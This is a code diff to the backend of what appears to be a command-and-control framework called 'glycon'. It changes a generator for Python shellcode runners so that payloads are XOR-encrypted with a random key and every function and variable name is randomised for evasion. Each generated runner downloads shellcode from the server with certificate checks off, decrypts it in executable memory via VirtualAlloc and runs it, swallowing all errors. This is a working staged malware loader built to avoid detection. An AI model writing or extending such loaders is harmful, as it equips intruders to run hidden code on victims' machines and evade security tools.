@@ -10,6 +10,8 @@ import traceback
 import tempfile
 import subprocess
 import uuid
+import secrets
+import random
 from werkzeug.security import generate_password_hash
 from glycon.secure_comms import SecureComms
 from glycon.config import CONFIG
@@ -275,8 +277,38 @@ def _obfuscate_code(code):
     return '\n'.join(obfuscated_lines)
 
 
-def _generate_runner_script(shellcode_url, callback_url=None):
+def _generate_runner_script(shellcode_url, callback_url=None, xor_key=None):
     """Generate the Python runner script that will download and execute shellcode"""
+    if xor_key is None:
+        raise ValueError("XOR key is required for shellcode encryption")
+
+    # Generate random names for obfuscation
+    import random
+    import string
+
+    def generate_random_name(length=8):
+        return ''.join(random.choices(string.ascii_letters, k=length))
+
+    # Generate random names for functions and variables
+    xor_func_name = generate_random_name()
+    recv_func_name = generate_random_name()
+    exec_func_name = generate_random_name()
+    run_func_name = generate_random_name()
+    main_func_name = generate_random_name()
+    url_var_name = generate_random_name()
+    key_var_name = generate_random_name()
+    data_var_name = generate_random_name()
+    key_len_var_name = generate_random_name()
+    space_var_name = generate_random_name()
+    buff_var_name = generate_random_name()
+    i_var_name = generate_random_name()
+    encrypted_byte_var_name = generate_random_name()
+    decrypted_byte_var_name = generate_random_name()
+    shellcode_func_var_name = generate_random_name()
+    encrypted_shellcode_param_name = generate_random_name()
+    response_var_name = generate_random_name()
+    xor_key_param_name = generate_random_name()
+
     script = f"""import socket
 import ctypes
 import argparse
@@ -284,44 +316,40 @@ import struct
 import requests
 import urllib3
 import sys
-
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
-
-def recv_shellcode(url):
-    response = requests.get(url, verify=False)
-    response.raise_for_status()
-    return response.content
-
-def execute_shellcode(shellcode):
+def {xor_func_name}({data_var_name}, {key_var_name}):
+    {key_len_var_name} = len({key_var_name})
+    return bytes([{data_var_name}[{i_var_name}] ^ {key_var_name}[{i_var_name} % {key_len_var_name}] for {i_var_name} in range(len({data_var_name}))])
+def {recv_func_name}({url_var_name}):
+    {response_var_name} = requests.get({url_var_name}, verify=False)
+    {response_var_name}.raise_for_status()
+    return {response_var_name}.content
+def {exec_func_name}({encrypted_shellcode_param_name}, {xor_key_param_name}):
     import threading
     ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_void_p
     ctypes.windll.kernel32.RtlCopyMemory.argtypes = (ctypes.c_void_p, ctypes.c_void_p, ctypes.c_size_t)
-    space = ctypes.windll.kernel32.VirtualAlloc(0, len(shellcode), 0x3000, 0x40)
-    buff = (ctypes.c_char * len(shellcode)).from_buffer_copy(shellcode)
-    ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_void_p(space), buff, len(shellcode))
-
-    def run_shellcode():
-        shellcode_func = ctypes.CFUNCTYPE(None)(space)
-        shellcode_func()
-
-    threading.Thread(target=run_shellcode).start()
-
-def mi(little):
-    print("Starting shellcode execution")
+    def {run_func_name}():
+        {space_var_name} = ctypes.windll.kernel32.VirtualAlloc(0, len({encrypted_shellcode_param_name}), 0x3000, 0x40)
+        {buff_var_name} = (ctypes.c_char * len({encrypted_shellcode_param_name})).from_buffer_copy({encrypted_shellcode_param_name})
+        ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_void_p({space_var_name}), {buff_var_name}, len({encrypted_shellcode_param_name}))
+        {key_len_var_name} = len({xor_key_param_name})
+        for {i_var_name} in range(len({encrypted_shellcode_param_name})):
+            {encrypted_byte_var_name} = ctypes.c_byte.from_address({space_var_name} + {i_var_name}).value
+            {decrypted_byte_var_name} = {encrypted_byte_var_name} ^ {xor_key_param_name}[{i_var_name} % {key_len_var_name}]
+            ctypes.c_byte.from_address({space_var_name} + {i_var_name}).value = {decrypted_byte_var_name}
+        {shellcode_func_var_name} = ctypes.CFUNCTYPE(None)({space_var_name})
+        {shellcode_func_var_name}()
+    threading.Thread(target={run_func_name}).start()
+def {main_func_name}({url_var_name}, {key_var_name}):
     try:
-        shellcode = recv_shellcode(little)
-        print(f"Downloaded {{len(shellcode)}} bytes")
+        {encrypted_shellcode_param_name} = {recv_func_name}({url_var_name})
+        {exec_func_name}({encrypted_shellcode_param_name}, {key_var_name})
     except Exception as e:
-        print(f"Error downloading file: {{e}}")
-        return
-
-    print("Executing shellcode")
-    execute_shellcode(shellcode)
-    print("Execution completed")
-
+        pass
 if __name__ == "__main__":
-    little = "{shellcode_url}"
-    mi(little)
+    {url_var_name} = "{shellcode_url}"
+    {key_var_name} = {xor_key!r}
+    {main_func_name}({url_var_name}, {key_var_name})
 """
     return script
 
@@ -884,6 +912,7 @@ def init_api_routes(app, socketio):
     @app.route('/api/generate_agent', methods=['POST'])
     @login_required
     def generate_agent():
+        
         try:
             data = request.get_json()
             if not data:
@@ -950,7 +979,8 @@ def init_api_routes(app, socketio):
                 killdate_enabled=str(config['killdate_enabled']),
                 killdate=config['killdate'] if config['killdate_enabled'] else "",
                 aes_key=repr(CONFIG.aes_key),  # Keep as bytes object
-                aes_iv=repr(CONFIG.aes_iv)     # Keep as bytes object
+                aes_iv=repr(CONFIG.aes_iv),     # Keep as bytes object
+                random=random
             )
 
             # Apply obfuscation
@@ -1081,12 +1111,12 @@ def init_api_routes(app, socketio):
                 
                 input_path = os.path.join(temp_dir, file.filename)
                 file.save(input_path)
-                
+
                 # Generate unique output name
                 random_value = str(uuid.uuid4())[:8]
                 output_name = f"{os.path.splitext(file.filename)[0]}-{agent_id}-{random_value}"
                 output_path = os.path.join(temp_dir, output_name + '.bin')
-                
+
                 # Build donut command
                 args_str = str(args) if args else ''
 
@@ -1135,16 +1165,26 @@ def init_api_routes(app, socketio):
             
             if not shellcode:
                 raise Exception("No shellcode was generated or provided")
-            
+
+            # Generate random XOR key for encryption
+            xor_key = secrets.token_bytes(32)  # 256-bit key
+
+            # Encrypt shellcode with XOR
+            def xor_encrypt(data, key):
+                key_len = len(key)
+                return bytes([data[i] ^ key[i % key_len] for i in range(len(data))])
+
+            encrypted_shellcode = xor_encrypt(shellcode, xor_key)
+
             # Generate random filename for shellcode
             shellcode_name = f"shellcode_{uuid.uuid4().hex[:8]}.bin"
             shellcode_dir = os.path.join(app.root_path, 'shellcodes')
             os.makedirs(shellcode_dir, exist_ok=True)
             shellcode_path = os.path.join(shellcode_dir, shellcode_name)
-            
-            # Save shellcode to file
+
+            # Save encrypted shellcode to file
             with open(shellcode_path, 'wb') as f:
-                f.write(shellcode)
+                f.write(encrypted_shellcode)
             
             # Determine server URL from agent_configurations
             conn = sqlite3.connect(CONFIG.database)
@@ -1156,15 +1196,15 @@ def init_api_routes(app, socketio):
             
             # Generate shellcode URL
             shellcode_url = f"{server_url}/api/download_shellcode/{shellcode_name}"
-            
-            # Generate runner script
+
+            # Generate runner script with XOR key
             callback_url = f"{server_url}/api/shellcode_output"
-            runner_content = _generate_runner_script(shellcode_url, callback_url)
+            runner_content = _generate_runner_script(shellcode_url, callback_url, xor_key)
             runner_name = f"runner_{uuid.uuid4().hex[:8]}.py"
             runners_dir = os.path.join(app.root_path, 'runners')
             os.makedirs(runners_dir, exist_ok=True)
             runner_path = os.path.join(runners_dir, runner_name)
-            
+
             with open(runner_path, 'w') as f:
                 f.write(runner_content)
                 
